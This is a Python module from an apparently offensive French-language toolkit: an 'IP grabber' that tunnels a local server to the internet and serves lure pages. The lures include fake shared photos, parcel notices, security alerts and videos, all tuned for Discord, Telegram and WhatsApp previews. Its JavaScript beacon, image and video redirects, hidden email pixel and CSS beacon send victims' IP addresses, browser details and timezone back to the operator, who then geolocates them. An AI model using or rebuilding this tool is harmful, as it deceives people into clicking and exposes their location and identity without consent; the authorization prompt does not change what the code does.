# -*- coding: utf-8 -*-
"""
MEOW-SEC :: TRACK — Chameleon IP Grabber v3
  OGP bait Discord/Telegram — vraie image preview (picsum.photos)
  Log serveur-side immédiat + confirmation JS ipify
  Tunnel : cloudflared auto-dl (primaire) → serveo SSH → localhost.run SSH
  Use only on systems you own or have explicit written permission to test.
"""
import os, time, threading, json, re, secrets, socket
import urllib.request
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN
from core.tunnel import print_tunnel_menu, start_tunnel as _start_tunnel_core
from rich.panel   import Panel
from rich.table   import Table
from rich.prompt  import Prompt, Confirm
from rich.live    import Live
from rich         import box

# ─── PIXEL PNG 1×1 transparent ───────────────────────────────────────────────
_PIXEL = (
    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
    b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01'
    b'\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
)

# ─── THÈMES ───────────────────────────────────────────────────────────────────
# (title, desc, picsum_seed, is_video)
_LURES = {
    "1": ("Photo partagée",        "Quelqu\'un a partagé une photo avec toi",         "nature",     False),
    "2": ("Suivi de colis",        "Ton colis est prêt — vérifie le statut",          "city",       False),
    "3": ("Document partagé",      "Un fichier a été partagé avec vous",               "office",     False),
    "4": ("Alerte sécurité",       "Connexion suspecte détectée sur votre compte",     "dark",       False),
    "5": ("Vidéo exclusive 🔥",    "Cette vidéo est dingue — regarde avant suppression","technology", True),
    "6": ("Clip inédit",           "Vidéo privée partagée avec toi",                   "abstract",   True),
    "7": ("Fail du jour 😂",       "Le pire fail que t\'aies jamais vu",               "sports",     True),
}

# URL d'une vraie vidéo publique courte (redirect après log)
_REAL_VIDEO_URL = "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4"

# ─── HTML BAIT OGP ────────────────────────────────────────────────────────────
# og:image = picsum.photos  → vraie photo HD → Discord/Telegram l'affiche
# JS fetch ipify → sendBeacon /log/TOKEN  → IP publique confirmée
_HTML = """\
<!DOCTYPE html><html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<meta property="og:type"        content="{og_type}">
<meta property="og:title"       content="{title}">
<meta property="og:description" content="{desc}">
<meta property="og:image"       content="https://picsum.photos/seed/{seed}/1200/630">
<meta property="og:image:width" content="1200">
<meta property="og:image:height"content="630">
<meta property="og:url"         content="{page_url}">
{video_tags}<meta name="twitter:card"       content="{tw_card}">
<meta name="twitter:title"      content="{title}">
<meta name="twitter:description"content="{desc}">
<meta name="twitter:image"      content="https://picsum.photos/seed/{seed}/1200/630">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#111;display:flex;align-items:center;justify-content:center;
     height:100vh;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#666}}
.c{{text-align:center}}
.sp{{width:32px;height:32px;border:2px solid #333;border-top-color:#666;
    border-radius:50%;animation:sp .7s linear infinite;margin:0 auto 18px}}
@keyframes sp{{to{{transform:rotate(360deg)}}}}
p{{font-size:13px}}
</style></head><body>
<div class="c"><div class="sp"></div><p>{title}</p></div>
<script>
(function(){{
  var T="{token}",U="{base_url}";
  function log(ip){{
    try{{navigator.sendBeacon(U+"/log/"+T,JSON.stringify({{
      ip:ip,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      w:screen.width,h:screen.height,ref:document.referrer
    }}))}}catch(e){{}}
  }}
  fetch("https://api.ipify.org?format=json")
    .then(function(r){{return r.json()}})
    .then(function(d){{log(d.ip)}})
    .catch(function(){{
      fetch("https://api64.ipify.org?format=json")
        .then(function(r){{return r.json()}})
        .then(function(d){{log(d.ip)}})
        .catch(function(){{}})
    }})
}})()
</script></body></html>"""

# ─── ÉTAT GLOBAL ──────────────────────────────────────────────────────────────
_hits        = []
_tokens      = {}   # token → lure_key
_lock        = threading.Lock()
_base_url    = ""

# ─── GEOIP ────────────────────────────────────────────────────────────────────
def _geo(ip):
    if not ip or ip.startswith(("127.","10.","192.168.","172.","::1")):
        return "local"
    try:
        r = urllib.request.urlopen(
            f"http://ip-api.com/json/{ip}?fields=country,city,org",
            timeout=4)
        d = json.loads(r.read())
        return f"{d.get('city','?')}, {d.get('country','?')} — {d.get('org','')[:25]}"
    except Exception:
        return "?"

def _plat(ua):
    u = ua.lower()
    if "discordbot"          in u: return f"[{OR}]Discord scraper[/]"
    if "telegrambot"         in u: return f"[{CY}]Telegram scraper[/]"
    if "slackbot"            in u: return f"[{CY}]Slack scraper[/]"
    if "whatsapp"            in u: return f"[{CY}]WhatsApp[/]"
    if "facebookexternalhit" in u: return f"[{CY}]Facebook[/]"
    if "python-requests" in u or "curl/" in u or "wget/" in u:
        return f"[{DM}]scanner[/]"
    if "mozilla"             in u: return f"[bold {G1}]★ NAVIGATEUR[/]"
    return f"[{DM}]?[/]"

def _real_ip(headers, addr):
    for h in ("CF-Connecting-IP","X-Forwarded-For","X-Real-Ip","True-Client-IP"):
        v = headers.get(h, "")
        if v: return v.split(",")[0].strip()
    return addr[0]

def _log_hit(token, ip, ua, method):
    threading.Thread(target=_log_async,
                     args=(token, ip, ua, method), daemon=True).start()

def _log_async(token, ip, ua, method):
    geo = _geo(ip)
    with _lock:
        _hits.append({
            "ts":     datetime.now().strftime("%H:%M:%S"),
            "token":  token,
            "ip":     ip,
            "geo":    geo,
            "plat":   _plat(ua),
            "method": method,
            "ua":     ua[:80],
        })

# ─── HTTP HANDLER ─────────────────────────────────────────────────────────────
class _H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        ua   = self.headers.get("User-Agent","")
        ip   = _real_ip(self.headers, self.client_address)
        path = self.path.split("?")[0].rstrip("/")

        # Bait OGP  /t/{token}
        m = re.match(r"^/t/([a-f0-9]{8})$", path)
        if m:
            token = m.group(1)
            if token not in _tokens:
                self._resp(404, "text/plain", b"Not Found"); return
            lure_key              = _tokens[token]
            title, desc, seed, is_video = _LURES.get(lure_key, _LURES["1"])
            if is_video:
                video_url = f"{_base_url}/v/{token}.mp4"
                video_tags = (
                    f'<meta property="og:video"            content="{video_url}">\n'
                    f'<meta property="og:video:url"        content="{video_url}">\n'
                    f'<meta property="og:video:secure_url" content="{video_url}">\n'
                    f'<meta property="og:video:type"       content="video/mp4">\n'
                    f'<meta property="og:video:width"      content="1280">\n'
                    f'<meta property="og:video:height"     content="720">\n'
                )
                og_type = "video.other"
                tw_card = "player"
            else:
                video_tags = ""
                og_type    = "website"
                tw_card    = "summary_large_image"
            html = _HTML.format(
                title=title, desc=desc, seed=seed,
                token=token, base_url=_base_url,
                page_url=f"{_base_url}/t/{token}",
                video_tags=video_tags, og_type=og_type, tw_card=tw_card,
            ).encode()
            self._resp(200, "text/html; charset=utf-8", html)
            _log_hit(token, ip, ua, "PAGE")
            return

        # Vidéo redirect  /v/{token}.mp4 — log IP puis redirect vers vraie vidéo
        m_vid = re.match(r"^/v/([a-f0-9]{8})\.mp4$", path)
        if m_vid:
            token = m_vid.group(1)
            if token in _tokens:
                _log_hit(token, ip, ua, f"[bold {G1}]VIDEO▶[/]")
            self.send_response(302)
            self.send_header("Location", _REAL_VIDEO_URL)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return

        # Image redirect  /t/{token}.jpg  — log IP puis redirect vers vraie image
        # Telegram/WhatsApp/email chargent l'image directement → IP loggée
        m_img = re.match(r"^/t/([a-f0-9]{8})\.(jpg|png|webp|gif)$", path)
        if m_img:
            token = m_img.group(1)
            if token in _tokens:
                _log_hit(token, ip, ua, f"IMG-AUTO")
            # Redirect vers vraie image (Telegram/email suit le redirect et affiche la photo)
            lure_key = _tokens.get(token, "1")
            seed = _LURES.get(lure_key, _LURES["1"])[2]  # index 2 = seed
            real_img = f"https://picsum.photos/seed/{seed}/800/600"
            self.send_response(302)
            self.send_header("Location", real_img)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return

        # Pixel PNG  /px/{token}
        m2 = re.match(r"^/px/([a-f0-9]{8})$", path)
        if m2:
            token = m2.group(1)
            self._resp(200, "image/png", _PIXEL)
            if token in _tokens:
                _log_hit(token, ip, ua, "PIXEL")
            return

        # Ping test  /ping
        if path == "/ping":
            self._resp(200, "text/plain", b"pong"); return

        self._resp(404, "text/plain", b"Not Found")

    def do_POST(self):
        path = self.path.split("?")[0].rstrip("/")
        m = re.match(r"^/log/([a-f0-9]{8})$", path)
        if not m:
            self._resp(204, "text/plain", b""); return
        token = m.group(1)
        if token in _tokens:
            try:
                ln   = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(min(ln, 8192)))
                ip   = body.get("ip") or _real_ip(self.headers, self.client_address)
                ua   = body.get("ua", self.headers.get("User-Agent",""))
                _log_hit(token, ip, ua,
                         f"[bold {G1}]JS✓[/]")
            except Exception:
                pass
        self._resp(204, "text/plain", b"")

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _resp(self, code, ct, body):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store, no-cache")
        self.end_headers()
        try: self.wfile.write(body)
        except Exception: pass

# ─── TUNNEL — délégué à core/tunnel.py ───────────────────────────────────────

# ─── LIVE TUI ─────────────────────────────────────────────────────────────────
def _panel(bait_url):
    t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style=G2,
              header_style=CY, show_lines=False, expand=True)
    t.add_column("Heure",   style=DM, width=9)
    t.add_column("IP",      style=G1, width=16)
    t.add_column("Géo",     style=DM, width=32)
    t.add_column("Source",  width=20)
    t.add_column("Méthode", style=OR, width=10)
    with _lock:
        rows = list(reversed(_hits[-30:]))
    for h in rows:
        t.add_row(h["ts"], h["ip"], h["geo"][:31], h["plat"], h["method"])
    total = len(_hits)
    js    = sum(1 for h in _hits if "JS" in h.get("method",""))
    return Panel(t,
        title=f"[bold {G1}]◈ TRACK — Live Hits ◈",
        subtitle=(f"[{DM}]URL: [{CY}]{bait_url}[/]  "
                  f"[{DM}]visites:[/] [{G1}]{total}[/]  "
                  f"[{DM}]IP JS confirmées:[/] [bold {G1}]{js}[/]"),
        border_style=G2)

# ─── RUN ──────────────────────────────────────────────────────────────────────
def run():
    global _base_url
    show_module_banner("track")
    cat_talk(CAT_SCAN, "IP Grabber — OGP bait + JS ipify — tunnel auto", OR)
    console.print()
    warn("AUTHORIZED USE ONLY — Utilisation non autorisée est illégale.")
    if not Confirm.ask(f"  [{OR}]◈ Je confirme avoir l'autorisation[/]", default=False):
        info("Annulé."); return
    console.print()

    # Choisir thème
    for k, (t, d, _, is_v) in _LURES.items():
        tag = f"[{OR}]▶[/] " if is_v else "  "
        console.print(f"  [{G2}][{k}][/] {tag}[{G1}]{t:<22}[/] [{DM}]{d}[/]")
    lure_key = Prompt.ask(f"\n  [{G1}]◈ Thème[/]", default="1").strip()
    if lure_key not in _LURES:
        lure_key = "1"

    token = secrets.token_hex(4)
    _tokens[token] = lure_key

    # Port libre
    port = 8877
    with socket.socket() as s:
        while True:
            try: s.bind(("127.0.0.1", port)); break
            except OSError: port += 1

    # Serveur HTTP
    server = HTTPServer(("0.0.0.0", port), _H)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    info(f"Serveur démarré sur port [{CY}]{port}[/]")

    # Choix du tunnel
    console.print()
    from rich.rule import Rule
    console.print(Rule(f"[{CY}] TUNNEL ", style=G2))
    print_tunnel_menu()
    tunnel_choice = ask_choice("Tunnel", "1")
    console.print()

    proc, tunnel_url = _start_tunnel_core(tunnel_choice, port)

    if not tunnel_url:
        tunnel_url = f"http://127.0.0.1:{port}"
        warn("Aucun tunnel actif — URL locale seulement (non accessible depuis internet)")

    _base_url = tunnel_url
    bait_url  = f"{tunnel_url}/t/{token}"
    pixel_url = f"{tunnel_url}/px/{token}"

    # Test ping
    console.print()
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{port}/ping", timeout=3)
        ok("Serveur local répond ✓")
    except Exception:
        err("Serveur local ne répond pas — problème de port?")

    lure     = _LURES[lure_key]
    is_video = lure[3]
    img_url  = f"{tunnel_url}/t/{token}.jpg"
    vid_url  = f"{tunnel_url}/v/{token}.mp4"

    video_block = ""
    if is_video:
        video_block = f"""
[bold {OR}]── Discord og:video (embed vidéo — play button → IP loggée) ──[/]
[{G1}]{bait_url}[/]
[{DM}]→ Discord affiche un embed avec bouton ▶ Play[/]
[{DM}]→ Quand la personne clique Play, son navigateur charge :[/]
[{CY}]{vid_url}[/]
[{DM}]→ IP loggée + redirect vers vraie vidéo publique[/]
"""
    else:
        video_block = f"""
[bold {OR}]── Discord (lien OGP — preview card — IP sur clic) ──[/]
[{G1}]{bait_url}[/]
[{DM}]→ Discord affiche la preview + image → IP loggée quand la personne CLIQUE[/]
"""

    console.print()
    console.print(Panel(
        f"""[bold {G1}]◈ TOKEN: {token}  ◈  Thème: {lure[0]}[/]
{video_block}
[bold {OR}]── Telegram / WhatsApp / iMessage (URL image — log sans clic) ──[/]
[{G1}]{img_url}[/]
[{DM}]→ L\'app charge l\'image directement → IP loggée automatiquement[/]

[bold {OR}]── Email HTML (log à l\'ouverture du mail) ──[/]
[{DM}]<img src="{pixel_url}" width="1" height="1" style="display:none">[/]

[bold {OR}]── Page web CSS silencieux ──[/]
[{DM}].x{{ background:url("{pixel_url}") no-repeat; }}[/]""",
        title=f"[bold {G1}]◈ LEURRES PAR PLATEFORME[/]", border_style=G2, padding=(0, 2)
    ))
    console.print(f"\n  [{OR}]CTRL+C[/] pour arrêter\n")

    try:
        with Live(refresh_per_second=3, console=console) as live:
            while True:
                live.update(_panel(bait_url))
                time.sleep(0.4)
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        if proc:
            try: proc.kill()
            except Exception: pass

    if _hits:
        os.makedirs("data", exist_ok=True)
        fname = f"data/track_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, "w", encoding="utf-8") as f:
            json.dump({"token": token, "lure": lure[0],
                       "url": bait_url, "hits": _hits}, f, indent=2)
        ok(f"[bold]{len(_hits)}[/] hits → [{G1}]{fname}[/]")
        js = sum(1 for h in _hits if "JS" in h.get("method",""))
        if js: find(f"{js} IP publiques confirmées via JS ipify")
    else:
        info("Aucun hit enregistré.")
